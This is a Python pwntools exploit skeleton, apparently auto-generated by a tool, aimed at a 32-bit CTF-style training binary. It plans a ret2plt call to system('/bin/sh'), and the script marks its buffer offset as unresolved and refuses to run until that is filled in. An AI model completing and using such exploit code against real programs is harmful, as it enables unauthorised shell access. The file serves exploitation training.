"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。

strategy    : ret2plt（ret2plt（system@plt））  status=blocked
target      : F:\pwn宝\pwncraft\artifacts\gw-training\intelpwn\challenge_x86_vuln  sha256=dd0b2e4a1c25bb80…  i386/32-bit  endian=little
mitigations : PIE=OFF NX=ON CANARY=OFF RELRO=PARTIAL FORTIFY=OFF
provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）
evidence    :
  - PLT stub 0x8049060
  - 节内容扫描：/bin/sh @ 0x804a008
gaps        :
  - 控制流劫持偏移未证明（需要崩溃/调试证据）
unresolved  :
  - OFFSET（到保存返回地址的填充长度）
"""
from pwn import *

TARGET = 'F:\\pwn宝\\pwncraft\\artifacts\\gw-training\\intelpwn\\challenge_x86_vuln'
context.binary = elf = ELF(TARGET, checksec=False)
context.log_level = "info"

OFFSET = 0x0            # UNRESOLVED: cyclic / 调试器确认的填充长度
SYSTEM_PLT = 0x8049060
BINSH = 0x804a008

UNRESOLVED = ['OFFSET（到保存返回地址的填充长度）']

def exploit():
    if UNRESOLVED:
        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))
    io = process(TARGET)
    payload = flat({OFFSET: [p32(SYSTEM_PLT), p32(0xdeadbeef), p32(BINSH)]})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
